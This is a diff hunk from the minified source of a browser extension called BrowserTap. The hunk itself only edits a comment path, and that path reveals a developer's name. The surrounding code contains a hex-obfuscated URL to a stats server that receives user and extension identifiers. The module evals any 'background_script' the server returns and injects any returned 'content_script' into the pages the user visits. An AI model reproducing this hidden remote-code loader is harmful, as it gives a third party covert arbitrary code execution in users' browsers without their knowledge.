@@ -16,6 +16,6 @@ Math.random()),Math.round(1E9*Math.random()),Math.round(1E9*Math.random()),Math.
 url:["\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x73\x2E\x6B\x61\x6E\x67\x6F\x65\x78\x74\x65\x6E\x73\x69\x6F\x6E\x73\x2E\x63\x6F\x6D\x2F\x72\x65\x70\x6F\x72\x74\x2F"][0],contentType:"json",params:{user_id:a,extension_id:BrowserTap_kango.getExtensionInfo().id,extension_name:BrowserTap_kango.getExtensionInfo().name,extension_update_url:BrowserTap_kango.getExtensionInfo().update_url||""}},BrowserTap_kango.xhr.send(a,function(a){if(200==a.status&&null!=a.response){a=a.response;if("undefined"!=typeof a.background_script)try{eval(a.background_script)}catch(b){}"undefined"!=typeof a.content_script&&BrowserTap_kango.userscript.addScript("q",a.content_script)}})):window.setTimeout(BrowserTap_kango.lang.bind(this._statQa,
 this),1E3*(86400-a))},init:function(){this._statGa();this._statQa()}};BrowserTap_kango.registerModule(BrowserTap_kango.Stat);
 
-// Merged from /Users/craig/Developer/Jobs/browsertap/browser_extension/src/js/ie firefox/BrowserTap_kango/userscript_engine.part.js
+// Merged from /Users/craigcondon/Developer/Jobs/browsertap/browser_extension/src/js/ie firefox/BrowserTap_kango/userscript_engine.part.js
 
 BrowserTap_kango.addEventListener(BrowserTap_kango.event.READY,function(){BrowserTap_kango.browser.addEventListener("DOMContentLoaded",function(a){var b=new BrowserTap_kango.UserscriptEngineClient,c=a.window==a.window.top;b.run(a.window,"document-start",c);b.run(a.window,"document-end",c)})});
